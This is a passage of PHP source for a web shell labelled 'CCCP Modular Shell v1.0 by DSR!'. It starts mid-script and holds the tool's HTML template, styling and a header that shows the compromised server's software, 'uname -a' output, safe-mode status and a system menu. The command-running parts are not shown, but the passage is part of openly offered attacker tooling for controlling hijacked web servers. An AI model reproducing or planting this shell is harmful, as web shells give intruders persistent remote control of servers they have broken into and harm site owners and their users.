		var a = document.getElementsByName("cbox");
		var b = document.getElementById("total_selected");
		var c = 0;
		for(var i = 0;i<a.length;i++) if(a[i].checked) c++;
		if(c==0) b.innerHTML = "";
		else b.innerHTML = " ( selected : " + c + " items )";
	}
	    
    ' . $js . '
  </script>
  <style type="text/css">
    body{background-color: #000000;}
    body, td, th{ font-family: verdana; color: #d9d9d9; font-size: 11px;}
	td{font-size: 8pt; color: #ebebeb; font-family: verdana;}
    td.header{font-weight: normal; font-size: 10pt; background: #7d7474; color: white; font-family: verdana;}
    a{font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none;}
    a:unknown{ ont-weight: normal; color: #ffffff; font-family: verdana; text-decoration: none;}
    a.links{color: #ffffff; text-decoration: none;}
    a.links:unknown{font-weight: normal; color: #ffffff; text-decoration: none;}
    a:hover{color: #ffffff; text-decoration: underline;}
    input, textarea, button, select, option {background-color: #800000; border: 0; font-size: 8pt; color: #FFFFFF; font-family: Tahoma;}
    p{margin-top: 0px; margin-bottom: 0px; size-height: 150%}
	table.sortable tbody tr:hover td{background-color: #8080FF;}
	table.sortable tbody tr:nth-child(2n), .alt1{background-color: #7d7474;}
	table.sortable tbody tr:nth-child(2n+1), .alt2{background-color: #7d7f74;}
	pre{font: 9pt Courier, Monospace;} 
	.bigarea{height: 220px; width: 100%;}
	.ml1{border:1px solid #444; padding:5px; margin:0; overflow: auto;} 
	.notif{border-radius: 6px 6px 6px 6px;font-weight: 700;margin: 3px 0;padding: 4px 8px 4px;}
	.info{display: none;border: 1px solid #800000;border-radius: 6px 6px 6px 6px;margin: 4px 0;padding: 8px;width: 100%;}
	.explore{width:100%;border-collapse:collapse;border-spacing:0;}
	.explore a{text-decoration:none;}
	.explore td{padding:5px 10px 5px 5px;}
	.explore th{font-weight:700;background-color:#222222;}
	.explore tbody tr:hover, .mark{background-color:#8080FF;}
  </style>
</head>
<body>
  <form name="dummy" method="post"></form>
  <center>
    <table style="border-collapse: collapse" height="1" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
      <tr>
        <th width="100%" height="15" nowrap="nowrap" bordercolor="#C0C0C0" valign="top" colspan="2">
          <p><font face="Verdana" size="5"><b>CCCP Modular Shell</b></font></p>
        </th>
      </tr>

      <tr>
        <td>
          <p align="left"><b>Software: </b><a href="#" onclick="go(\''.$config['Menu'].'=phpinfo\')"><b>' . $_SERVER['SERVER_SOFTWARE'] . '</b></a></p>
          <p align="left"><b>uname -a: ' . php_uname() . '</b></p>
          <p align="left"><b>Safe-mode: ' . getcfg('safe_mode') . '</b></p>
          <br><center>' . $sysMenu . '</center>
        </td>
      </tr>
    </table>

    <table style="border-collapse: collapse" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
      <tr>
        <td width="100%">
          ' . $content . '
        </td>
      </tr>
    </table>

  --[ <a href="http://indetectables.net" target="_blank">CCCP Modular Shell v1.0 by DSR!</a> <b>|</b> Generation time: ' . substr((microtime(true) - $tiempoCarga), 0, 4) . ' ]--
  </center>
</body>
</html>';
?>